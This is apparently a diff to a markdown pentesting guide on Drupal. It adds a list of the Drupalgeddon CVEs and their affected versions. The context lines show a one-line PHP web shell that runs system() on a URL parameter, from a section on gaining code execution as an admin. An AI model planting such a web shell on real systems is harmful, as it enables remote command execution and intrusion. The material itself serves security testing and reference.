@@ -31,3 +31,9 @@ In versions older than 8.0, it was possible to log in as an admin and enable the
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ?>
 ```
+
+## Famous Vulnerabilities
+
+	CVE-2014-3704 Drupalgeddon Drupal 7.x versions prior to 7.32 are vulnerable
+	CVE-2018-7600 Drupalgeddon2 Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 
+	CVE-2018-7602 Drupalgeddon3 Drupal 7.x before 7.59 Drupal 8.x before 8.5.3
